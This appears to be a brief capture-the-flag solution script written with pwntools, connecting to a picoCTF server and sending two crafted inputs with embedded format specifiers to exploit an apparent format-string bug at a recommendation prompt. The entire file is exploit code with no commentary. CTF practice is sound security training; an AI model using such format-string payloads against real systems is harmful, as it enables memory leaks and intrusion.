from pwn import *

p  = remote('mimas.picoctf.net', 61507)

p.sendlineafter(b'Enter your recommendation: ',b'Gr%114d_Cheese')
p.sendlineafter(b'Enter your recommendation: ',b'Cla%sic_Che%s%steak')


p.interactive()
